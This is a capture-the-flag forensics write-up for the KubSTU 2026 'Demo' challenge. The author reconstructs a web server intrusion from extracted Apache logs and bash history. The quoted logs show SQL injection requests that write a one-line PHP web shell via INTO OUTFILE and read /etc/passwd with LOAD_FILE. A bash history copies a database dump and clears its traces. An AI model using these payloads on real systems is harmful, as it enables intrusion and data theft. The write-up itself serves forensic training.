---
layout: post
title:  "Demo"
date:   2026-05-02 19:17:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /KubSTU-2026-demo/
---

**Author**: [@Alkimor1](https://t.me/Alkimor1)

**Category**: Forensics

**Description**: During a security audit, suspicious activity was detected on the company's web server. It is believed that an attacker was able to penetrate the network, move to the database server, and steal confidential information.

Identify which vulnerability was used to gain initial access and what was uploaded. Under which user did the attacker subsequently operate? What was copied? Example: `KubSTU{XSS,p0wny.php,Administrator,data.txt}`

I get the challenge files:
```shell
file Demo.rar  
Demo.rar: RAR archive data, v5

unrar x Demo.rar  
  
UNRAR 7.12 freeware      Copyright (c) 1993-2025 Alexander Roshal  
  
Extracting from Demo.rar  
  
Creating    DB                                                        OK  
Creating    DB/etc                                                    OK  
Creating    DB/etc/mysql                                              OK  
Extracting  DB/etc/mysql/my.cnf                                       OK  
Creating    DB/home                                                   OK  
Creating    DB/home/dbadmin                                           OK  
Extracting  DB/home/dbadmin/.bash_history                             OK  
Extracting  DB/home/dbadmin/.ssh_authorized_keys                      OK  
Creating    DB/var                                                    OK  
Creating    DB/var/log                                                OK  
Extracting  DB/var/log/auth.log                                       OK  
Creating    service                                                   OK  
Creating    service/home                                              OK  
Creating    service/home/www-data                                     OK  
Extracting  service/home/www-data/.bash_history                       OK  
Extracting  service/home/www-data/.ssh_key_key                        OK  
Creating    service/var                                               OK  
Creating    service/var/log                                           OK  
Creating    service/var/log/apache2                                   OK  
Extracting  service/var/log/apache2/access.log                        OK  
Extracting  service/var/log/apache2/error.log                         OK  
Creating    service/var/www                                           OK  
Creating    service/var/www/html                                      OK  
Extracting  service/var/www/html/about.html                           OK  
Extracting  service/var/www/html/admin.php                            OK  
Extracting  service/var/www/html/config.php                           OK  
Extracting  service/var/www/html/contact.php                          OK  
Extracting  service/var/www/html/index.php                            OK  
Creating    DB/var/lib                                                OK  
Creating    DB/var/lib/mysql                                          OK  
All OK
```

I find initial access via SQLi:
```shell
cat service/var/log/apache2/access.log | grep "sqlmap/1.6.12"  
192.168.1.100 - - [26/Mar/2026:10:16:05 +0300] "GET /index.php?id=1%20UNION%20SELECT%201,%27%3C%3Fphp%20system(%24_GET%5B%22cmd%22%5D)%3B%20%3F%3E%27%20INTO%20OUTFILE%20%27/var/www/html/uploads/shell.php%27 HTTP/1.1" 200 12 "-" "sqlmap/1.6.12 (http://sqlmap.org)"  
192.168.1.100 - - [26/Mar/2026:10:15:30 +0300] "GET /index.php?id=1%20UNION%20SELECT%201,@@datadir HTTP/1.1" 200 120 "-" "sqlmap/1.6.12 (http://sqlmap.org)"  
192.168.1.100 - - [26/Mar/2026:10:15:22 +0300] "GET /index.php?id=1%20UNION%20SELECT%201,LOAD_FILE(%27/etc/passwd%27) HTTP/1.1" 200 890 "-" "sqlmap/1.6.12 (http://sqlmap.org)"
```

Url decoding makes it easier to read. They upload `shell.php`:
```shell
192.168.1.100 - - [26/Mar/2026:10:16:05  0300] "GET /index.php?id=1 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/uploads/shell.php' HTTP/1.1" 200 12 "-" "sqlmap/1.6.12 (http://sqlmap.org)"
192.168.1.100 - - [26/Mar/2026:10:15:30  0300] "GET /index.php?id=1 UNION SELECT 1,@@datadir HTTP/1.1" 200 120 "-" "sqlmap/1.6.12 (http://sqlmap.org)"
192.168.1.100 - - [26/Mar/2026:10:15:22  0300] "GET /index.php?id=1 UNION SELECT 1,LOAD_FILE('/etc/passwd') HTTP/1.1" 200 890 "-" "sqlmap/1.6.12 (http://sqlmap.org)"
```

The attacker ran as `dbadmin`:
```shell
cat DB/home/dbadmin/.bash_history  
mysql -u root -p  
use webapp_db;  
SELECT * FROM sensitive_info;  
SHOW DATABASES;  
SHOW TABLES;  
DESCRIBE sensitive_info;  
cp /var/lib/mysql/confidential_data.sql /tmp/.backup_data  
ls -la /tmp/  
cat /tmp/.backup_data  
rm /tmp/.backup_data  
history -c
```

Finally, they steal the file `confidential_data.sql`.

`KubSTU{SQLi,shell.php,dbadmin,confidential_data.sql}`
